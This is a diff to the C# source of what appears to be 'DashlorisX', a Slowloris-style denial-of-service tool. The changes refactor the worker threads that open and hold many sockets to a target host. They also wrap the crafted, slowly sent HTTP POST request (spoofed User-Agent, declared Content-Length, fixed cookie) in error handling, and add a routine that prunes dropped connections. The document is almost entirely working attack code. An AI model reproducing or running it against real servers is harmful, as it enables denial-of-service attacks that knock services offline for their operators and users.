@@ -110,6 +110,9 @@ namespace TheDashlorisX
 		    Collection.Add(DashNet.GetInteger(TextBox.Text));
 		}
 
+		if (Collection[3] / Collection[2] < 1)
+		    return (-1, -1, -1, -1, -1, false);
+
 		bool UAR = (S3Class2.S2Container3.BackColor == 
 		    Color.DarkMagenta ? true : false);
 
@@ -302,20 +305,28 @@ namespace TheDashlorisX
 		{
 		    if (DashShell.Connected)
 		    {
-			string Default = ("Mozilla/5.0 (Windows NT 10.0; WOW64; rv:65.0) Gecko/20100101 Firefox/65.0 IceDragon/65.0.2");
+			try
+			{
+			    string Default = ("Mozilla/5.0 (Windows NT 10.0; WOW64; rv:65.0) Gecko/20100101 Firefox/65.0 IceDragon/65.0.2");
 
-			string Coal = string.Format
-			(
-			    ($"POST / HTTP/@\r\n".Replace("@", Tier1.Item4)) +
-			    ($"Host: @\r\n".Replace("@", Tier1.Item1)) +
-			    ($"Content-Length: @\r\n".Replace("@", Tier2.Item5.ToString())) +
-			    ($@"User-Agent: {(Tier2.Item6 ? GetRandomUA() : Default)}" + $"\r\n") +
-			    ($"Accept-Encoding: gzip, deflate\r\n") +
-			    ($"Upgrade-Insecure-Requests: 1\r\n") + 
-			    ($"Cookie: DashlorisXCookie;\r\n\r\n") 
-			);
-			
-			DashShell.Send(Encoding.ASCII.GetBytes(Coal));
+			    string Coal = string.Format
+			    (
+				($"POST / HTTP/@\r\n".Replace("@", Tier1.Item4)) +
+				($"Host: @\r\n".Replace("@", Tier1.Item1)) +
+				($"Content-Length: @\r\n".Replace("@", Tier2.Item5.ToString())) +
+				($@"User-Agent: {(Tier2.Item6 ? GetRandomUA() : Default)}" + $"\r\n") +
+				($"Accept-Encoding: gzip, deflate\r\n") +
+				($"Upgrade-Insecure-Requests: 1\r\n") +
+				($"Cookie: DashlorisXCookie;\r\n\r\n")
+			    );
+
+			    DashShell.Send(Encoding.ASCII.GetBytes(Coal));
+			}
+
+			catch
+			{
+			    DashShell.Close();
+			}
 		    }
 		}
 
@@ -397,19 +408,44 @@ namespace TheDashlorisX
 		}
 	    }
 
-	    private bool SocketConnected(Socket Socket)
+	    void FilterConnectables(ref List<Socket> Connectables, SpruceLog Logy, (string, int, int, string) Tier1, (int, int, int, int, int, bool) Tier2)
 	    {
 		try
 		{
-		    return (Socket.Receive(Encoding.ASCII
-			.GetBytes("Are you still there?")) != 0);
+		    void CleanupConnectable(ref List<Socket> _Connectables, int Id)
+		    {
+			ReportStatics(Logy, false);
+
+			_Connectables[Id].Close(0);
+			_Connectables.RemoveAt(Id);
+		    }
+
+		    for (int Id = 0; Id < Connectables.Count; Id += 1)
+		    {
+			try
+			{
+			    byte[] Lead = Encoding.ASCII.GetBytes("Are you alive?");
+
+			    int Response = Connectables[Id].Receive(Lead, Lead.Length,SocketFlags.None);
+
+			    if (Response < Lead.Length)
+			    {
+				CleanupConnectable(ref Connectables, Id);
+				continue;
+			    }
+			}
+
+			catch
+			{
+			    CleanupConnectable(ref Connectables, Id);
+			    continue;
+			}
+		    }
 		}
 
-		catch
+		catch (Exception E)
 		{
-		    Socket.Close(0);
-
-		    return false;
+		    throw (ErrorHandler.GetException(E));
 		}
 	    }
 
@@ -438,17 +474,23 @@ namespace TheDashlorisX
 			}
 		    }
 
-		    int SendDelay = Tier2.Item1;
-		    int Timeout = Tier2.Item2;
-		    int MaxCons = Tier2.Item4;
-		    int Workers = Tier2.Item3;
-		    int Port = Tier1.Item2;
+		    var SendDelay = Tier2.Item1;
+		    var Timeout = Tier2.Item2;
 
-		    string Host = Tier1.Item1;
+		    var Workers = Tier2.Item3;
+		    var MaxCons = Tier2.Item4;
+
+		    var Host = Tier1.Item1;
+		    var Port = Tier1.Item2;
 
 		    SendLog($"- Starting {Workers} Dash Workers ....");
 
-		    List<Thread> DashWorkers = new List<Thread>();
+		    void Wait()
+		    {
+			Thread.Sleep(SendDelay);
+		    }
+
+		    var DashWorkers = new List<Thread>();
 
 		    for (int Worker = 1; Worker <= Workers; Worker += 1)
 		    {
@@ -486,27 +528,11 @@ namespace TheDashlorisX
 					}
 
 					CurrentRequests += 1;
-					
-					Thread.Sleep(SendDelay);
+					Wait();
 				    }
 
-				    byte[] byteSet = new byte[4];
-
-				    for (int Id = 0; Id < Connections.Count; Id += 1)
-				    {
-					if (!SocketConnected(Connections[Id]))
-					{
-					    Connections.RemoveAt(Id);
-					    ReportStatics(Logy, false);
-					}
-
-					else
-					{
-					    SendArtilleryShell(Connections[Id], Tier1, Tier2);
-					}
-				    }
-				    
-				    Thread.Sleep(SendDelay);
+				    FilterConnectables(ref Connections, Logy, Tier1, Tier2);
+				    Wait();
 				}
 
 				if (Connections.Count >= 50)
